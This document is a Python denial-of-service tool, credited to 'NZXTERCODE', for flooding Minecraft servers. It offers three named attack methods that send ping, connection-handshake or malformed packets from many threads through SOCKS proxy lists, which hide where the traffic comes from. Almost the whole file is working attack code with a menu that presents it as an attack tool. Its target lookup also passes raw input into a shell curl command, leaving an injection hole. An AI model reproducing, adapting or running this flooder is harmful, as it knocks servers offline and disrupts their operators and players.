#!/usr/bin/python3

#BY NZXTERCODE https://dsc.gg/nzxterdc

import requests, string, socket, socks, time, random, threading, sys, datetime, argparse, os


mode = "Flood"

parser = argparse.ArgumentParser(description=("PacketFlooder"))
parser.add_argument("-host", type=str,
					help="‚Ä¢ Victim [HOST]")
parser.add_argument("-p", "--port", type=int,
					default="25565", help="‚Ä¢ Victim [PORT]")
parser.add_argument("-m", "--method", type=int,
					default="2", help="‚Ä¢ Attack Method")
parser.add_argument("-threads", "--threads", type=int,
					default="1000", help="‚Ä¢ Threads")
parser.add_argument("-type", "--type", type=int,
					default="4", help="‚Ä¢ Type [SOCKS]")
parser.add_argument("-amp", "--amplification", type=str,
					default="100", help="‚Ä¢ Amplification")
#parser.add_argument("-print", "--print", type=str,
#					default="true", help="‚Ä¢ Print Optimization")
parser.add_argument("-pFile", "--proxiesFile", type=str,
					default="socks4.txt", help="‚Ä¢ Proxies File")
parser.add_argument("-noP", "--noProxy", type=str,
					default="false", help="‚Ä¢ Attack without proxies [Faster]")


args = parser.parse_args()

printOption = "false"





def build_threads(mode,thread_num,event,socks_type):
	if mode == "Flood":
		for _ in range(thread_num):
			th = threading.Thread(target = flood,args=(event,socks_type,))
			th.setDaemon(True)
			th.start()


def flood(event,socks_type):
	if (opcion == 2):
		proxy = random.choice(proxies).strip().split(":")
		nicks = random.choice(lista)
		Caracteres = len(nicks)
		Tamano = bytes([Caracteres + 2])
		Zero = b'\x00'
		NickL = bytes([Caracteres])
		encodeNick = nicks[:-1].encode(encoding="utf-8")
		event.wait()
		while True:
			try:
				s = socks.socksocket()
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
					s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
					s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
				if socks_type == 6:
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				s.connect((str(ip), int(port)))
				try:
					for _ in range(amplification):
						s.send(Mensaje + Tamano + Zero + NickL + encodeNick)
				except:
					s.close()
				#print ("[¬ª] " + str(Method) + " | Proxy - " +str(proxy[0])+":"+str(proxy[1])) // I wouldn't activate it, it spams too much!
			except:
				s.close()
	if (opcion == 1):
		proxy = random.choice(proxies).strip().split(":")
		event.wait()
		while True:
			try:
				s = socks.socksocket()
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				if socks_type == 6:
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				s.connect((str(ip), int(port)))
				try:
					for _ in range(amplification):
						s.send(Mensaje)
				except:
					s.close()
				#print ("[¬ª] " + str(Method) + " | Proxy - " +str(proxy[0])+":"+str(proxy[1])) // I wouldn't activate it, it spams too much!
			except:
				s.close()


def opciones():
	global ip
	global port
	global proxies
	global amplification
	global socks_type
	global choice
	global opcion
	global thread_num
	global Test
	global Test2
	global lista
	global Mensaje
	global Method
	color = '\33[31m'
	green = '\33[32m'
	white = '\33[37m'
	print(color + """
	    
	 ‚ñÑ‚ñÑ‚ñÑ‚ñÑ   ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñÑ‚ñÑ‚ñÑ     ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñì    
	‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ ‚ñì‚ñà   ‚ñÄ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí    
	‚ñí‚ñà‚ñà‚ñí ‚ñÑ‚ñà‚ñà‚ñí‚ñà‚ñà‚ñà  ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë    
	‚ñí‚ñà‚ñà‚ñë‚ñà‚ñÄ  ‚ñí‚ñì‚ñà  ‚ñÑ‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñë    
	‚ñë‚ñì‚ñà  ‚ñÄ‚ñà‚ñì‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí
	‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí‚ñë‚ñë ‚ñí‚ñë ‚ñë ‚ñí ‚ñë‚ñë    ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë ‚ñí ‚ñë‚ñë   ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñë‚ñì  ‚ñë
	‚ñí‚ñë‚ñí   ‚ñë  ‚ñë ‚ñë  ‚ñë   ‚ñë      ‚ñí   ‚ñí‚ñí ‚ñë   ‚ñë      ‚ñë ‚ñí ‚ñí‚ñë   ‚ñë ‚ñí ‚ñí‚ñë ‚ñë ‚ñë ‚ñí  ‚ñë
	 ‚ñë    ‚ñë    ‚ñë    ‚ñë        ‚ñë   ‚ñí    ‚ñë      ‚ñë ‚ñë ‚ñë ‚ñí  ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë ‚ñë   
	 ‚ñë         ‚ñë  ‚ñë              ‚ñë  ‚ñë            ‚ñë ‚ñë      ‚ñë ‚ñë      ‚ñë  ‚ñë
	      ‚ñë                                                            

    """)
	opcion = int(input(green + """

                  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                  ‚îÇ               By NZXTERCODE                  ‚îÇ
                  ‚îÇ                                              ‚îÇ
                  ‚îÇ 1. DemonShredder - Sends PING packets        ‚îÇ
                  ‚îÇ 2. HadesDestroyer - Sends Connection Packets ‚îÇ
                  ‚îÇ 3. NullPing - Sends invalid packets          ‚îÇ
                  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                    üíÄ ¬ª Choose your method: """))
	print("")    
	print(white + "")
	ip = str(input("¬ª IP: "))
	if ip == "":
		print("¬ª Please enter correct host or ip")
		sys.exit(1)
	if mode == "flood":
		pass
	r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
	start1 = ("\"ip\":\"")
	end1 = "\","
	ip = (r1.split(start1))[1].split(end1)[0]

	encodeIP = ip.encode(encoding="utf-8", errors="strict")
	lista = open("Nicks.txt").readlines()
	PingSlapper = b'\xfe\x01\xfa\x00\x0b\x00M\x00C\x00|\x00P\x00i\x00n\x00g\x00H\x00o\x00s\x00t\x00#\x7f\x00\x0e\x001\x004\x007\x00.\x001\x003\x005\x00.\x003\x001\x00.\x001\x007\x005\x00\x00\x03\xe7'
	CPSFlooder = b'\x0f\x00/\tlocalhostc\xdf\x02'
	#Part2 = b'\x00/\tlocalhostc\xdf\x02\r\x00\x0bq\x0b/\xfd\x00\xa1#\xfd\xa1v\xfd'
	NullPing = b'\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01AttackByNzxter'
	if (opcion == 1):
		Mensaje = PingSlapper
		Method = "DemonShredder"
	if (opcion == 2):
		Mensaje = CPSFlooder
		Method = "HadesDestroyer"
	if (opcion == 3):
		Mensaje = NullPing
		Method = "NullPing"
	print("")    
	port = str(input("¬ª Puerto: "))
	if port == '':
		port = int(25565)
		print("¬ª Default choose port 25565\r\n¬ª Port 25565 was chosen")
	else:
		port = int(port)
	thread_num = int(input("¬ª Threads [default: 1000]: "))
	if thread_num == "":
		thread_num = int(1000)
	choice = ""
	while choice == "":
		choice = str(input("¬ª Socks 4 or 5? [default: 4]: ")).strip()
		if choice == "5":
			choice = "5"
		if choice != "4" and choice != "5":
			print("[¬ª] Error TYPE_INVALID try again")
			choice = ""
		if choice == "4":
			socks_type = 4
		else:
			socks_type = 5
	if choice == "4":
		out_file = str("socks4.txt")
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = ("socks5.txt")
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = "socks4.txt"
		proxies = open(out_file).readlines()
	print ("¬ª TYPE %s // Proxies: %s" %(choice,len(proxies)))
	amplification = str(input("¬ª Loop (How many requests per thread):"))
	if amplification == "":
		amplification = int(100)
	else:
		amplification = int(amplification)
	NoProxy = str(input("¬ª NoProxy (BETA [Attack without Proxies <FASTER> ]) true/false: "))
	if (NoProxy == "true"):
			socks_type = 6 # No Proxies
			beta = "True"
	else:
			socks.type = choice
			beta = "False"
	print("¬ª IP - " + str(ip))
	print("¬ª Port - " + str(port))
	print("¬ª Method - " + str(Method))
	print("¬ª Threads - " + str(thread_num))
	print("¬ª Socks - " + str(socks_type))
	print("¬ª Amplification - " + str(amplification))
	print("¬ª NoProxy - " + str(beta))
	print("")
	input("¬ª Press enter ¬´")
	print("")
	start()

def start():
	event = threading.Event()
	print("¬ª Initiating Threads")
	print("¬ª Starting Attack [Print Mode Disabled, Change in Flooder.py]")
	build_threads(mode,thread_num,event,socks_type)
	event.clear()
	event.set()
	while True:
		try:
			time.sleep(0)
		except KeyboardInterrupt:
			break
	


if len(sys.argv) == 1:
	opciones()
else:
	global ip
	global port
	global socks_type
	global proxies
	global amplification
	global choice
	global opcion
	global thread_num
	global Test
	global Test2
	global Mensaje
	global Method
	global lista
	ip = args.host
	r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
	start1 = ("\"ip\":\"")
	end1 = "\","
	ip = (r1.split(start1))[1].split(end1)[0]
	lista = open("Nicks.txt").readlines()
	PingSlapper = b'\xfe\x01\xfa\x00\x0b\x00M\x00C\x00|\x00P\x00i\x00n\x00g\x00H\x00o\x00s\x00t\x00#\x7f\x00\x0e\x001\x004\x007\x00.\x001\x003\x005\x00.\x003\x001\x00.\x001\x007\x005\x00\x00\x03\xe7'
	CPSFlooder = b'\x0f\x00/\tlocalhostc\xdf\x02' 
	Part2 = b'\x01\xbc\x02\x0b\x00\tNZXTERO' # can be randomized using a list of nicknames, but that's up to you
	NullPing = b'\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01AttackByNzxter'
	port = args.port
	opcion = args.method
	if (opcion == 1):
		Mensaje = PingSlapper
		Method = "DemonShredder"
	if (opcion == 2):
		Mensaje = CPSFlooder
		Method = "HadesDestroyer"
	if (opcion == 3):
		Mensaje = NullPing
		Method = "NullPing"
	thread_num = args.threads
	socks_type = args.type
	out_file = args.proxiesFile
	proxies = open(out_file).readlines()
	amplification = int(args.amplification)
	NoProxy = args.noProxy
	if (NoProxy == "true"):
			socks_type = 6 # No Proxies
			beta = "True"
	else:
			socks.type = args.type
			beta = "False"
	print("¬ª IP - " + str(ip))
	print("¬ª Port - " + str(port))
	print("¬ª Method - " + str(Method))
	print("¬ª Threads - " + str(thread_num))
	print("¬ª Socks - " + str(socks_type))
	print("¬ª Amplification - " + str(amplification))
	print("¬ª NoProxy - " + str(beta))
	print("")
	input("¬ª Press enter ¬´")
	print("")
	start()



